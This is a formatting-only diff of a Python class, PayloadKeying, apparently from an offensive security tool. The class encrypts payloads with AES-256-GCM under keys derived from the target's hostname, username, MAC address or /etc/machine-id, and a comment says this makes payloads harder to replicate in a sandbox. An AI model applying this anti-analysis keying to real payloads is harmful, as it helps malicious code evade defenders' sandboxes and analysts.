@@ -57,7 +57,7 @@ class PayloadKeying:
             env_value.encode("utf-8"),
             salt.encode("utf-8"),
             iterations=100_000,
-            dklen=32  # 256-bit key
+            dklen=32,  # 256-bit key
         )
         return key
 
@@ -70,8 +70,8 @@ class PayloadKeying:
 
     def _decrypt(self, encrypted: bytes, key: bytes) -> bytes:
         """AES-256-GCM decryption."""
-        nonce = encrypted[:self.nonce_size]
-        ct = encrypted[self.nonce_size:]
+        nonce = encrypted[: self.nonce_size]
+        ct = encrypted[self.nonce_size :]
         aesgcm = AESGCM(key)
         return aesgcm.decrypt(nonce, ct, None)
 
@@ -107,8 +107,7 @@ class PayloadKeying:
         print(f"  {C_GREEN}[+] Payload keyed to machine-id{C_RESET}")
         return encrypted
 
-    def key_to_multi(self, payload: bytes, hostname: str = "",
-                     username: str = "", mac: str = "") -> bytes:
+    def key_to_multi(self, payload: bytes, hostname: str = "", username: str = "", mac: str = "") -> bytes:
         """Multi-factor keying -- combine multiple env values.
         More factors = harder to replicate in sandbox."""
         combined = f"{hostname.strip().lower()}|{username.strip().lower()}|{mac.strip().lower()}"
@@ -133,19 +132,17 @@ class PayloadKeying:
 
         # Key extraction code per source type
         key_extractors = {
-            "hostname": 'import socket; env_val = socket.gethostname().strip().lower()',
+            "hostname": "import socket; env_val = socket.gethostname().strip().lower()",
             "mac": (
-                'import uuid; '
-                'mac = ":".join(f"{b:02x}" for b in uuid.getnode().to_bytes(6, "big")); '
-                'env_val = mac'
+                'import uuid; mac = ":".join(f"{b:02x}" for b in uuid.getnode().to_bytes(6, "big")); env_val = mac'
             ),
-            "user": 'import getpass; env_val = getpass.getuser().strip().lower()',
+            "user": "import getpass; env_val = getpass.getuser().strip().lower()",
             "machine_id": (
                 'env_val = open("/etc/machine-id").read().strip() '
                 'if __import__("os").path.isfile("/etc/machine-id") else ""'
             ),
             "multi": (
-                'import socket, getpass, uuid; '
+                "import socket, getpass, uuid; "
                 'mac = ":".join(f"{b:02x}" for b in uuid.getnode().to_bytes(6, "big")); '
                 'env_val = f"{socket.gethostname().strip().lower()}'
                 '|{getpass.getuser().strip().lower()}|{mac}"'
